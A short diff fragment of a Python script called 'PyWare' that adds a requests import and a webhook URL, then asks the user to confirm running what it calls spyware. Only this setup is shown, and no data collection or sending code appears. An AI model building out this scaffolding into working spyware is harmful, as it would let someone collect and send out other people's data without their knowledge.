@@ -1,6 +1,8 @@
 import time
 import os
+import requests
 
+Webhook_url = "https://example.com"
 print("--PyWare--")
 Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
 if Run.upper() == "Y":
